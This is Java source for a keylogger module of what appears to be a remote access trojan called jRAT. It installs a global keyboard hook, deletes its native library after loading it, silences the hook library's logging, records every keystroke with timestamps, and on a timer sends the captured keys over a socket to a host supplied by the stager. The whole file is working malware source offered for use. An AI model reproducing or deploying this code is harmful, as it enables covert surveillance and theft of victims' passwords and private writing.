package jRAT.modules;

import java.awt.im.InputContext;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class ModuleKeylogger implements NativeKeyListener {
    
    private static volatile List<Character> buffer          = new LinkedList<Character>();
    private static volatile StringBuffer bufferDebugged     = new StringBuffer();
    private static Map<Character, String> characterMap      = new HashMap<Character, String>();

    private final static AtomicBoolean CAPTURING            = new AtomicBoolean(false);
    private final static AtomicBoolean AUTODUMP             = new AtomicBoolean(false); 
    private static final AtomicLong AUTODUMP_INTERVAL       = new AtomicLong(60*5*1000);    // 5 min (default)
    private static final AtomicInteger TYPED_KEY_COUNTER    = new AtomicInteger(0);
    private final static ReentrantLock SOCKET_LOCK          = new ReentrantLock();
    
    private static String HOST                              = null;
    private static Integer PORT                             = null;
    private static String SHARED_LIBRARY_PATH               = null;

    private static Socket socket                            = null;
    private static DataInputStream socketInput              = null;
    private static DataOutputStream socketOutput            = null;

    private ModuleKeylogger() {}

    /* -------------------------------------------------------------------------------------------------------- */

    public static void init(Class stage) throws Exception
    {
        HOST                = (String)  stage.getMethod("getHost", new Class[0]).invoke(null, new Object[0]);
        PORT                = (Integer) stage.getMethod("getPort", new Class[0]).invoke(null, new Object[0]);
        SHARED_LIBRARY_PATH = (String)  stage.getMethod("getSharedLibraryPath", new Class[] { String.class }).invoke(null, new Object[] { ModuleKeylogger.class.getName() });

        Class classCustomLibraryLocator = (Class) stage.getMethod("getDependencyClassReference", new Class[] { String.class }).invoke(null, new Object[] { "jRAT.moduleAuxiliary.ModuleKeyloggerCustomLibraryLocator" });
        Class classGlobalScreen         = (Class) stage.getMethod("getDependencyClassReference", new Class[] { String.class }).invoke(null, new Object[] { "org.jnativehook.GlobalScreen" });
        Class classNativeKeyListener    = (Class) stage.getMethod("getDependencyClassReference", new Class[] { String.class }).invoke(null, new Object[] { "org.jnativehook.keyboard.NativeKeyListener" });

        classCustomLibraryLocator.getMethod("setLibraryPath", new Class[] { String.class }).invoke(null, new Object[] { SHARED_LIBRARY_PATH });

        String oldJNativeHookPath = System.getProperty("jnativehook.lib.locator"); 
        System.setProperty("jnativehook.lib.locator", "jRAT.moduleAuxiliary.ModuleKeyloggerCustomLibraryLocator");

        Logger logger = Logger.getLogger(classGlobalScreen.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        classGlobalScreen.getMethod("registerNativeHook", new Class[0]).invoke(null, new Object[0]);
        classGlobalScreen.getMethod("addNativeKeyListener", new Class[] { classNativeKeyListener }).invoke(null, new ModuleKeylogger());

        new File(SHARED_LIBRARY_PATH).delete();
        
        if (oldJNativeHookPath != null)
            System.setProperty("jnativehook.lib.locator", oldJNativeHookPath);
        else
            System.clearProperty("jnativehook.lib.locator");        
        
        characterMap.put('.', ".");
        characterMap.put(',', ",");
        characterMap.put(':', ":");
        characterMap.put(';', ";");
        characterMap.put('-', "-");
        characterMap.put('_', "_");
        characterMap.put(' ', " ");
        characterMap.put('\n', "[\n]");
        characterMap.put('\t', "[\t]");
    }
    
    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: Keylogger ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "start",                ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "stop",                 ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "status",               ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getautodump",          ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "setautodump",          "true|false"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getautodumpinterval",  ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "setautodumpinterval",  "seconds"));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getkeylang",           ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "dump",                 ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "bgdump",               ""));
        return moduleInfo.toString().getBytes("UTF-8");
    }
    
    /* -------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        switch (methodName)
        {
            case "start":   return true;
            case "bgdump":  return true;
            default:        return false;
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    private static void open()
    {
        try
        {
            if (socket == null)
            {
                socket       = new Socket(HOST, PORT);
                socketInput  = new DataInputStream(socket.getInputStream());
                socketOutput = new DataOutputStream(socket.getOutputStream());
                socketOutput.writeUTF("ModuleKeylogger");
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void close()
    {
        try
        {
            if (socket != null)
            {
                socketOutput.writeUTF("CLOSE");
                socketInput.close();
                socketOutput.close();
                socket.close();
                socket = null;
            }
        }
        catch (Exception ex) {}
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    
    public static void start() throws UnsupportedEncodingException
    {
        TYPED_KEY_COUNTER.set(0);
        buffer.clear();
        bufferDebugged = new StringBuffer();
        
        if (CAPTURING.get())
            return;

        CAPTURING.set(true);
        while (CAPTURING.get())
        {
            try { Thread.sleep(AUTODUMP_INTERVAL.get()); }
            catch (InterruptedException ex) {}
            
            if (AUTODUMP.get() && buffer.size() > 0)
            {
                bgdump();
            }
        }
    }

    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] stop() throws Exception
    {
        CAPTURING.set(false);
        SOCKET_LOCK.lock();
        close();
        SOCKET_LOCK.unlock();
        return new String("Capture stopped!").getBytes("UTF-8");
    }
    
    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] status() throws UnsupportedEncodingException
    {       
        boolean capturingON   = CAPTURING.get();
        boolean autodumpON    = AUTODUMP.get();
        long autodumpInterval = AUTODUMP_INTERVAL.get();
        int pressedKeyCounter = TYPED_KEY_COUNTER.get();

        StringBuilder responseBuilder = new StringBuilder();
        responseBuilder.append(String.format("%-50s%s\n", "Capturing:", (capturingON ? "ON" : "OFF")));
        responseBuilder.append(String.format("%-50s%s\n", "Autodump:", (autodumpON ? "ON" : "OFF")));
        responseBuilder.append(String.format("%-50s%d\n", "Autodump interval (seconds):", (autodumpInterval/1000)));
        responseBuilder.append(String.format("%-50s%d\n", "Pressed key counter value:", pressedKeyCounter));
        return responseBuilder.toString().getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] dump() throws UnsupportedEncodingException
    {
        TYPED_KEY_COUNTER.set(0);
        Character[] rawBufferAsArray = buffer.toArray(new Character[0]);
        buffer.clear();
        bufferDebugged = new StringBuffer();
        
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < rawBufferAsArray.length; i++)
        {
            switch (Character.getType(rawBufferAsArray[i]))
            {
                case Character.LOWERCASE_LETTER:            builder.append(rawBufferAsArray[i]); break;
                case Character.UPPERCASE_LETTER:            builder.append(rawBufferAsArray[i]); break;
                case Character.TITLECASE_LETTER:            builder.append(rawBufferAsArray[i]); break;
                case Character.DECIMAL_DIGIT_NUMBER:        builder.append(rawBufferAsArray[i]); break;
                case Character.CURRENCY_SYMBOL:             builder.append(rawBufferAsArray[i]); break;
                case Character.MATH_SYMBOL:                 builder.append(rawBufferAsArray[i]); break;
                case Character.INITIAL_QUOTE_PUNCTUATION:   builder.append(rawBufferAsArray[i]); break;
                case Character.FINAL_QUOTE_PUNCTUATION:     builder.append(rawBufferAsArray[i]); break;
                case Character.SPACE_SEPARATOR:             builder.append(rawBufferAsArray[i]); break;
                case Character.LINE_SEPARATOR:              builder.append(rawBufferAsArray[i]); break;
                case Character.PARAGRAPH_SEPARATOR:         builder.append(rawBufferAsArray[i]); break;
                default:
                {
                    String value = characterMap.get(rawBufferAsArray[i]);
                    if (value != null)
                        builder.append(value);
                }
            }
        }
        return builder.toString().getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */

    public static void bgdump()
    {
        try
        {
            String fileTimestamp          = new Date().toString();
            byte[] dumpBuffer;
            byte[] dumpBufferDebugged     = bufferDebugged.toString().getBytes("UTF-8");
            Character[] dumpBufferAsArray = buffer.toArray(new Character[0]);

            TYPED_KEY_COUNTER.set(0);
            buffer.clear();
            bufferDebugged = new StringBuffer();

            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < dumpBufferAsArray.length; i++)
            {
                switch (Character.getType(dumpBufferAsArray[i]))
                {
                    case Character.LOWERCASE_LETTER:            builder.append(dumpBufferAsArray[i]); break;
                    case Character.UPPERCASE_LETTER:            builder.append(dumpBufferAsArray[i]); break;
                    case Character.TITLECASE_LETTER:            builder.append(dumpBufferAsArray[i]); break;
                    case Character.DECIMAL_DIGIT_NUMBER:        builder.append(dumpBufferAsArray[i]); break;
                    case Character.CURRENCY_SYMBOL:             builder.append(dumpBufferAsArray[i]); break;
                    case Character.MATH_SYMBOL:                 builder.append(dumpBufferAsArray[i]); break;
                    case Character.INITIAL_QUOTE_PUNCTUATION:   builder.append(dumpBufferAsArray[i]); break;
                    case Character.FINAL_QUOTE_PUNCTUATION:     builder.append(dumpBufferAsArray[i]); break;
                    case Character.SPACE_SEPARATOR:             builder.append(dumpBufferAsArray[i]); break;
                    case Character.LINE_SEPARATOR:              builder.append(dumpBufferAsArray[i]); break;
                    case Character.PARAGRAPH_SEPARATOR:         builder.append(dumpBufferAsArray[i]); break;
                    default:
                    {
                        String value = characterMap.get(dumpBufferAsArray[i]);
                        if (value != null)
                            builder.append(value);
                    }
                }
            }
            dumpBuffer = builder.toString().getBytes("UTF-8");

            SOCKET_LOCK.lock();

            if (socket == null)
                open();
            
            socketOutput.writeUTF("OK");
            socketOutput.writeUTF("captured_keys_" + fileTimestamp);
            socketOutput.writeLong(dumpBuffer.length);
            socketOutput.write(dumpBuffer);
            socketOutput.flush();

            socketOutput.writeUTF("OK");
            socketOutput.writeUTF("captured_keys_debugged" + fileTimestamp);
            socketOutput.writeLong(dumpBufferDebugged.length);
            socketOutput.write(dumpBufferDebugged);
            socketOutput.flush();
        }
        catch (Exception ex) {}
        finally
        {
            try { if (!CAPTURING.get()) close(); }
            catch (Exception ex) {}
            
            SOCKET_LOCK.unlock();
        }
    }
    
    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] getautodump() throws UnsupportedEncodingException
    {
        boolean autodumpON = AUTODUMP.get();
        if (autodumpON)
            return new String("Autodump ON").getBytes("UTF-8");
        else
            return new String("Autodump OFF").getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */
    
    public static byte[] setautodump(String autodump) throws UnsupportedEncodingException
    {
        boolean autodumpON = Boolean.valueOf(autodump);
        AUTODUMP.set(autodumpON);
        if (autodumpON)
            return new String("Autodump value set => Autodump ON").getBytes("UTF-8");
        else
            return new String("Autodump value set => Autodump OFF").getBytes("UTF-8");
    }

    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] getautodumpinterval() throws UnsupportedEncodingException
    {
        long autodumpInterval = AUTODUMP_INTERVAL.get();
        return new String("Autodump interval (seconds): " + (autodumpInterval/1000)).getBytes("UTF-8");
    }
    
    /* -------------------------------------------------------------------------------------------------------- */

    public static byte[] setautodumpinterval(String seconds) throws UnsupportedEncodingException
    {
        long autodumpInterval = Long.valueOf(seconds);
        if (autodumpInterval < 30)
            return new String("Autodump interval can't be less than 30 seconds!").getBytes("UTF-8");
        else
        {
            AUTODUMP_INTERVAL.set(autodumpInterval*1000);
            return new String("Autodump interval set => " + autodumpInterval + " (seconds)").getBytes("UTF-8");
        }
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
    
    public static byte[] getkeylang() throws UnsupportedEncodingException
    {
        InputContext context = InputContext.getInstance();          
        return new String("Keyboard Language: " + context.getLocale().toString()).getBytes("UTF-8");   
    }
    
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */
    /* -------------------------------------------------------------------------------------------------------- */

    @Override
    public void nativeKeyTyped(NativeKeyEvent e)
    {
        if (CAPTURING.get())
        {
            buffer.add(e.getKeyChar());
            TYPED_KEY_COUNTER.incrementAndGet();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e)
    {
        if (CAPTURING.get())
        {
            bufferDebugged.append("[" + NativeKeyEvent.getKeyText(e.getKeyCode()) + "][" + e.getKeyCode() + "][" + new Date().toString() + "]\n");
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {}
    
    /* -------------------------------------------------------------------------------------------------------- */

}
